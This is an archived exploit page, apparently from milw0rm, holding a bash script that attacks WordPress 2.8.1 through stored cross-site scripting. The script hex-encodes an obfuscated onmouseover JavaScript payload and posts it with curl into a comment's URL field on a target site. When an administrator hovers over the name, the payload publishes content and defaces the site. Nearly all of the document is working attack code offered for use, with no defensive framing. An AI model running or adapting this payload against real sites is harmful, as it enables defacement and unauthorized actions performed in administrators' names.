<html><head><title>Wordpress 2.8.1 (url) Remote Cross Site Scripting Exploit</title></head><pre>#!/bin/bash

echo &quot;wp281.quickprz // iso^kpsbr&quot;

SITE=$1
COMMENT=$2
MESSAGE=&quot;h4x0riZed by the superfreakaz0rz&quot;

if [ &quot;X$SITE&quot; = &quot;X&quot; ]; then
	echo &quot;$0 &lt;url&gt; [postID]&quot;
	echo &quot;f.e. $0 www.worstpress.eu&quot;
	exit
fi

if [ &quot;X$POSTID&quot; = &quot;X&quot; ]; then
	POSTID=1
fi


echo &quot;[+] building payload&quot;

WHERE=&quot;title&quot; # can also be 'content'
PATH=&quot;$SITE/wp-comments-post.php&quot;

WHERE=`echo -n &quot;$WHERE&quot; | /usr/bin/od -t d1 -A n | /bin/sed 's/\\s\\s*/,/g' | /bin/sed 's/^,//'`
EVILURL=&quot;http://w.ch'onmouseover='document.getElementById(String.fromCharCode($WHERE)).value=this.innerHTML;document.getElementById(String.fromCharCode(112,117,98,108,105,115,104)).click();&quot;
echo &quot;[-] payload is $EVILURL for '$MESSAGE'&quot;

EVILURL=`echo -n &quot;$EVILURL&quot; | /usr/bin/od -t x1 -A n | /usr/bin/tr &quot; &quot; %`
MESSAGE=`echo -n &quot;$MESSAGE&quot; | /usr/bin/od -t x1 -A n | /usr/bin/tr &quot; &quot; %`
RNDDATA=`/bin/date +%S%s`;

echo &quot;[!] delivering data&quot;
/usr/bin/curl -A &quot;Quickprz&quot; -d &quot;author=$MESSAGE&amp;email=kelly@hackforums.net&amp;url=$EVILURL&amp;comment=hi+there%5F+this+is+just+some+very+harmless+spam+$RNDDATA&amp;submit=Submit+Comment&amp;comment_post_ID=$POSTID&quot; $PATH

echo &quot;[X] all done. now wait for admin to mouse-over that name.&quot;

# milw0rm.com [2009-07-24]</pre></html>